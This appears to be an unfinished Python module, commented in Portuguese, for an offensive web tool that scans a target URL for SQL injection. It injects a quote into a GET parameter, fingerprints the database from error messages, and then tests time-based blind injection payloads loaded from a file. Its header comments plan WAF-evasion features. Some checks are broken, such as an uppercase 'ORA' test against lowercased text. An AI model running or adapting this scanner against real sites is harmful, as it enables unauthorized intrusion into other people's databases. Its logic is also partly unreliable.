# !/usr/bin/env python3
## começar com a captação de exxecção da intrruupção do usuário, CTRL+C
## criar a funão responsáve pra filtrar o atributo id do aalvo passada
## caso não seja enconrado, procure por campos e formulário
## emplementar mecanismos de seguramça na parte do usuário do programa, mecanismos de burlação de WAF, entre outras


## começar por testes de injeção sql baseada no tempo... criar um jit

from pymysql import NULL



def _sqlInjection(target_url, payload = NULL, verbose = NULL ):
    try:
        try:
            from core import colors as color
            from core.utils import avaregeTime
            from core.config import AVARAGE_TIME_BASED_SQLI
            from core.config import DEFAULT_SQLI_TIME_BASED_TIME
            from core.config import SQLI_BLIND_TIME_BASED_SUCCED_COUNT
            
            import re
            import requests
            
            print("["+color.green+"!"+color.end+"]"+color.end+" Modo de"+color.orange+" deteção injeção sql"+ color.end+" passada para o alvo "+color.orange+target_url+color.end)
            print("["+color.green+"+"+color.end+"] Testando a estabilidade da conexão, pode levar alguns minutos...")
            
            if(avaregeTime(target_url) >= AVARAGE_TIME_BASED_SQLI):
                print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+color.end+" A sua conexão parece estar instável, recomenda-se que se tenha uma conexão estável."+color.end, end='')
                ## ainda mostro o jitter aqui só pra comparar com o tempo de teste de injeções sql
                user_option = str(input(" Deseja continuar? (sim/nao)"))
                if user_option.lower() == 'sim':
                    pass
                elif user_option.lower() == 'nao':
                    print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+color.end+" Terminando o teste..."+color.end, end='')
                    quit()
                else:
                    print(color.info_1+color.red_0+color.info_2+"Erro: Entrada inválida, saindo...")
                    quit()
            else:
                print("["+color.green+"+"+color.end+"] Conexão estável ")
                pass
                print("["+color.green+"+"+color.end+"] Tempo média da requisição: "+color.cian, avaregeTime(target_url), color.end)
                
            ## filtrando a variável url id do alvo passado
            try:
                print("["+color.green+"+"+color.end+"] Procurando por variáveis URL...") 
                para = re.compile('(=)\w+')
                if para.search(target_url):
                        '''
                        Faz o teste sqli no parâmetro GET assim como filtrado 👇👇👇👇👇👇, substituindo quaquer parâmetro encontrado pelo o pyaload base '
                        '''
                        splited_para = para.search(target_url).group()
                        
                        print("["+color.green+"+"+color.end+"] Identificando o SGBD com "+color.cian+" SQLI INFERENCIAL(CEGA)"+color.end)
                        
                        try:
                            exploited_target_url = target_url.replace(splited_para, "='")
                            requesicao = requests.post(url=exploited_target_url)
    
                            if 'mysql' in requesicao.text.lower():
                                print("["+color.green+"*"+color.end+"] SGBD identificado: "+color.cian+"[MYSQL]"+color.end)
                                print("["+color.green+"+"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
                                with open('./mode/payload/mysql/blind_payloads_time_based', 'r') as blind_time_based_sqli:
                                    for lines in blind_time_based_sqli:
                                        print("["+color.end+"*"+color.end+"] [Payload] "+color.cian+lines+color.end, end='')
                                        exploited_target_url = target_url.replace(splited_para, "="+lines)
                                        if avaregeTime(exploited_target_url) >= DEFAULT_SQLI_TIME_BASED_TIME:
                                            print("["+color.green+"+"+color.end+"] ["+color.green+"Viável"+color.end+"]"+ color.cian, lines+color.end, end='')
                                        else:
                                            print("["+color.green+"+"+color.end+"] ["+color.red+"Bloqueado"+color.end+"]"+ color.cian, lines+color.end, end='')
                                print("["+color.green+"+"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
                                         
                            elif 'native client' in requesicao.text.lower():
                                print("["+color.green+"*"+color.end+"] SGBD identificado: "+color.cian+"[MSSQL]")
                            elif 'syntax error' in requesicao.text.lower():
                                print("["+color.green+"*"+color.end+"] SGBD identificado: "+color.cian+"[POSTGRES]")
                            elif 'ORA' in requesicao.text.lower():
                                print("["+color.green+"*"+color.end+"] SGBD identificado: "+color.cian+"[ORACLE]")
                            else:
                                print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+" SGBD não encontrada, o alvo deve estar sendo protegido por mecanismos de segurança, tal como WAF."+color.end, end='')
                                user_option = str(input(' Deseja continuar o teste? (sim/nao):'))
                                if user_option.lower() == 'sim':
                                    ## continua o scaneamento 
                                    pass
                                elif user_option.lower() == 'nao':
                                    print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+" saindo do web spider..."+color.end)
                                    quit()
                                else:
                                    print(color.info_1+color.red_0+color.info_2+" Erro: "+color.orange+" Opção inválida, saindo do web spider..."+color.end)
                                    quit()
                                    ## como verificar que a injeção teve sucesso???
                        except FileNotFoundError as e:
                            e = str(e)
                            print(color.info_1+color.red_0+color.info_2+" Erro: arquivo "+color.red, e[38:],color.orange+" não foi encontrado"+color.end)
                            quit()
                else:
                    '''
                    Faz o teste sqli nos campos de formulários filtrados 👇👇👇👇👇👇👇👇👇
                    '''
                    print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+color.end+" variáveis URL não encontrado('http://www.site.com/artigo.php?id=1')"+color.end)
                    print(color.info_1+color.red_0+color.info_2+" Aviso:"+color.end+color.end+" Será usada campos inputs..."+color.end)
                    ## primeiro filttra formulários
                    ## caso  tenha mais de um, pede a opção do usuário assim como no xss
                    ## com base na entrada do usuário, faz os testes sqli
            except requests.exceptions.RequestException as e:
                print(color.info_1+color.red_0+color.info_2+" Erro: "+color.red+"alvo"+color.orange+" Inacessível, verifique a sua ligação à internet ou contacte o"+color.red+" Web master."+color.end)
                quit()
        except ImportError as e:
            print(color.info_1+color.red_0+color.info_2+"Erro: Falha na "+color.red+"importação"+color.orange+" dos Módulos.")
            quit()
    except KeyboardInterrupt as e:
        print(color.info_1+color.red_0+color.info_2+" Erro: "+color.red+"Interrupção"+color.orange+" pela parte do usuário"+color.red+" Saindo..."+color.end)
        quit()